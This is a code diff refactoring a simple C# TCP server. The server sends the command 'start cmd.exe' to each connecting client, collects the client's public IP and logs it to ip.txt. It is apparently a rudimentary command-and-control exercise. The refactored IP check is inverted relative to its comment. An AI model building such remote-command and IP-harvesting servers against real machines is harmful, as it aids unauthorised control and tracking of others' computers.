@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices.ComTypes;
@@ -8,82 +9,125 @@ namespace TCPListener
 {
     internal class Program
     {
+        // Initialisations of color for all the programm
+        const ConsoleColor errorColor = ConsoleColor.Red;
+        const ConsoleColor succesColor = ConsoleColor.Green;
+        const ConsoleColor infoColor = ConsoleColor.Blue;
+
         static void Main(string[] args)
         {
-            TcpListener server = null;
-
-
             // Initialisation
-            byte[] clientIpBytes = new byte[256];
             int numberIpBytes = 0;
-            int port = 13000;
-            string clientIp = string.Empty;
-            const string serverIp = "10.5.48.44";
 
-            IPAddress localIp = IPAddress.Parse(serverIp);
+            // Get the server
+            TcpListener server = createListener();
 
-            // Build the server
-            server = new TcpListener(localIp, port);
-            server.Start();
-
-            TcpClient client = null;
-            NetworkStream stream = null;
-            Console.WriteLine("Server opened ! \n");
-
-            // Do it for each client that connected
-            while (true)
+            if (server != null)
             {
-                getClientIp(ref client, ref stream, ref server, ref numberIpBytes, ref clientIpBytes, ref clientIp);
+                setColor(succesColor);
+                Console.WriteLine("Server opened ! \n");
+
+                // Do it for each client that connected
+                while (true)
+                {
+                    handleCommunication(server, numberIpBytes);
+                }
+            }
+            else
+            {
+                setColor(errorColor);
+                Console.WriteLine("The server wasn't able to open...");
             }
         }
 
-        static void getClientIp(ref TcpClient client, ref NetworkStream stream, ref TcpListener server, ref int numberIpBytes, ref byte[] clientIpBytes, ref string clientIp)
+        /// <summary>
+        /// Create a listener (It's the server which will listen for messages from clients)
+        /// </summary>
+        /// <returns>The TcpListener which is the server tgat started</returns>
+        static TcpListener createListener()
+        {
+            // Initialisation
+            const int port = 13000;
+            const string serverIp = "127.0.0.1";
+
+            IPAddress localIp = IPAddress.Parse(serverIp);
+            // Build the server
+            TcpListener server = new TcpListener(localIp, port);
+            server.Start();
+
+            return server;
+        }
+
+        /// <summary>
+        /// Principal function which send an command to do to the client and collect back the client public IP
+        /// </summary>
+        /// <param name="server">The server</param>
+        /// <param name="numberIpBytes">The </param>
+        /// <param name="clientIpBytes"></param>
+        /// <param name="clientIp"></param>
+        private static void handleCommunication(TcpListener server, int numberIpBytes)
         {
             try
             {
-                Console.ForegroundColor = ConsoleColor.Green;
+                byte[] clientIpBytes = new byte[256];
+                string clientIp = string.Empty;
+
+                // Connexion part
+                setColor(infoColor);
                 Console.WriteLine("Waiting for a client... \n");
-                client = server.AcceptTcpClient();
-                stream = client.GetStream();
+
+                TcpClient client = server.AcceptTcpClient();
+                NetworkStream stream = client.GetStream();
+
                 Console.WriteLine("New client found ! \n");
 
                 // Transform command into bytes and puts it in the stream
                 string command = "start cmd.exe";
                 byte[] bytes = System.Text.Encoding.ASCII.GetBytes(command);
-
-
                 stream.Write(bytes, 0, bytes.Length);
-                Console.ForegroundColor = ConsoleColor.Blue;
+
+                setColor(succesColor);
                 Console.WriteLine("Message sent: " + command);
 
                 // Get IP and create file but only if an IP has been returned
                 numberIpBytes = stream.Read(clientIpBytes, 0, clientIpBytes.Length);
+                clientIp = System.Text.Encoding.ASCII.GetString(clientIpBytes);
 
-                if (numberIpBytes != 0)
+                // "Nothing" is sended if the client hasn't found any IP, so it's only letters and no numbers
+                if (clientIp.All(char.IsLetter))
                 {
-                    clientIp = System.Text.Encoding.ASCII.GetString(clientIpBytes);
-
-                    Console.WriteLine("Client IP: " + clientIp);
-
-                    string fileName = "ip.txt";
-
-                    if (!File.Exists(fileName))
-                    {
-                        File.Create(fileName).Close();
-                    }
-                    File.AppendAllText(fileName, clientIp + "\n");
+                    createFile(clientIp);
                 }
                 else
                 {
-                Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("No IP was found");
+                    setColor(errorColor);
+                    Console.WriteLine("\nNo IP was found...\n\n");
                 }
             }
             catch (Exception ex)
             {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\nError: " + ex.Message + "\n");
+                setColor(errorColor);
+                Console.WriteLine("\nError: " + ex.Message + "\n\n");
             }
+        }
+
+        private static void setColor(ConsoleColor color)
+        {
+            Console.ForegroundColor = color;
+        }
+
+        private static void createFile(string clientIp)
+        {
+            //Initialisation
+            string fileName = "ip.txt";
+
+            Console.WriteLine("Client IP: " + clientIp);
+
+            if (!File.Exists(fileName))
+            {
+                File.Create(fileName).Close();
+            }
+            File.AppendAllText(fileName, clientIp + "\n");
         }
     }
 }
